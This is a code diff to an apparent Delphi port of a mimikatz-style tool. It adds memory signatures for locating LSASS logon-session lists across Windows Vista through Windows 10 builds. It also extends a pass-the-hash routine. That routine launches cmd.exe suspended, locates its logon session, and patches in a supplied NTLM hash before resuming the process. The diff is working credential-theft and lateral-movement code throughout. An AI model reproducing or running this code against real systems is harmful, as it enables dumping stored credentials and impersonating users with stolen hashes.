@@ -536,9 +536,10 @@ end;
 function logonpasswords(pid:dword;luid:int64=0;hash:string='';func:pointer =nil):boolean;
 const
   //dd Lsasrv!LogonSessionList in windbg
-  PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
   //1703 works for 1709
   PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
+  PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
+  PTRN_WN60_LogonSessionList:array [0..13] of byte=($33, $ff, $45, $85, $c0, $41, $89, $75, $00, $4c, $8b, $e3, $0f, $84);
   PTRN_WN61_LogonSessionList:array [0..11] of byte=($33, $f6, $45, $89, $2f, $4c, $8b, $f3, $85, $ff, $0f, $84);
   PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
@@ -572,31 +573,44 @@ begin
   //
   if (lowercase(osarch)='amd64') then
      begin
-     if copy(winver,1,3)='6.1' then
+     if copy(winver,1,3)='6.0' then //vista
+        begin
+        setlength(pattern,sizeof(PTRN_WN60_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN60_LogonSessionList[0],sizeof(PTRN_WN60_LogonSessionList));
+        //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
+        patch_pos:=21;
+        end ;
+     if copy(winver,1,3)='6.1' then  //win7 & 2k8
         begin
         setlength(pattern,sizeof(PTRN_WN61_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN61_LogonSessionList[0],sizeof(PTRN_WN61_LogonSessionList));
         //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
         patch_pos:=19;
         end ;
-     if copy(winver,1,3)='6.3' then
+     if copy(winver,1,3)='6.3' then  //win8.1 aka blue
         begin
         setlength(pattern,sizeof(PTRN_WN63_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN63_LogonSessionList[0],sizeof(PTRN_WN63_LogonSessionList));
-        //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
         patch_pos:=36;
         end ;
-     if copy(winver,1,3)='10.' then //win10
+     if (pos('-1703',winver)>0) or (pos('-1709',winver)>0) then //win10
         begin
         setlength(pattern,sizeof(PTRN_WN1703_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN1703_LogonSessionList[0],sizeof(PTRN_WN1703_LogonSessionList));
-        //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
-        //{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
-        //{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
         patch_pos:=23;
         end;
-
-
+     if (pos('-1803',winver)>0)  then //win10
+        begin
+        setlength(pattern,sizeof(PTRN_WN1803_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN1803_LogonSessionList[0],sizeof(PTRN_WN1803_LogonSessionList));
+        patch_pos:=23;
+        end;
+     if (pos('-1903',winver)>0)  then //win10
+        begin
+        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
+        patch_pos:=23;
+        end;
      end;
   if (lowercase(osarch)='x86') then
      begin
@@ -675,8 +689,8 @@ begin
                                    //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
                                    if (luid=0) or (luid=_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart) then
                                    begin
-                                   if func<>nil then fn(func)(pointer(@logsesslist[0]) );
                                    log('**************************************************',1);
+                                   if func<>nil then fn(func)(pointer(@logsesslist[0]) );
                                    log('entry#current:'+inttohex(current,sizeof(pointer)),0) ;
                                    log('entry#prev:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).blink,sizeof(pointer)),0) ;
                                    log('entry#next:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer)),0) ;
@@ -1083,7 +1097,16 @@ begin
   end;
 end;
 
-function pth:boolean;
+function callback_LogonPasswords(param:pointer=nil):dword;stdcall;
+var
+  credentials:nativeuint;
+begin
+  //example
+  log('!LUID:'+inttohex(PKIWI_MSV1_0_LIST_63(param).LocallyUniqueIdentifier.LowPart,sizeof(dword))) ;
+
+end;
+
+function pth(username,hash,domain:string):boolean;
 const
   LOGON_WITH_PROFILE=1;
   LOGON_NETCREDENTIALS_ONLY=2;
@@ -1107,25 +1130,26 @@ begin
   si.wShowWindow := 1;
   bret:=CreateProcessWithLogonW(pwidechar('admin'),pwidechar('.'),pwidechar(''),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar('c:\windows\system32\cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
   if bret=false then writeln('failed: '+inttostr(getlasterror));
-  //OpenProcessToken / GetTokenInformation +tokenstatistics to get LogonSession LUID
+
   if bret=true then
      begin
+     //OpenProcessToken / GetTokenInformation +tokenstatistics to get LogonSession LUID
      fillchar(stats,sizeof(stats),0);
      if OpenProcesstoken(pi.hProcess ,TOKEN_READ,token)= true
         then if GetTokenInformation(token,tokenstatistics,@stats,sizeof(stats),len)
            then writeln('LUID:'+inttohex(stats.AuthenticationId,sizeof(stats.AuthenticationId)));
      writeln(pi.dwProcessId );
-
-     end;
-
-
-  //cycle thru logonsessions to match the luid
-  //patch the credentialblob to stuff the ntlm hash (encrypted with encryptlsa)
+    if stats.AuthenticationId<>0 then
+    begin
+    //cycle thru logonsessions to match the luid
+    //patch the credentialblob to stuff the ntlm hash (encrypted with encryptlsa)
     findlsakeys (lsass_pid,deskey,aeskey,iv );
-    logonpasswords (lsass_pid ,stats.AuthenticationId,''); //put your hash here
-//and finally resume...
+    logonpasswords (lsass_pid ,stats.AuthenticationId,hash); //put your hash here
+    //and finally resume...
     ResumeThread(pi.hThread );
-    //_killproc(pi.dwProcessId); //temp
+    end // if stats.AuthenticationId<>0 then
+    else _killproc(pi.dwProcessId);
+    end; //if bret=true then
 end;
 
 begin
@@ -1213,7 +1237,7 @@ begin
   p:=pos('/pth',cmdline);
   if p>0 then
    begin
-   pth;
+   pth('admin','','.');
    end;
   p:=pos('/enumcred2',cmdline);
   if p>0 then
@@ -1252,7 +1276,8 @@ begin
   if p>0 then
      begin
      findlsakeys (lsass_pid,deskey,aeskey,iv );
-     logonpasswords (lsass_pid);
+     //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );
+     logonpasswords (lsass_pid );
      end;
   p:=pos('/wdigest',cmdline);
   if p>0 then
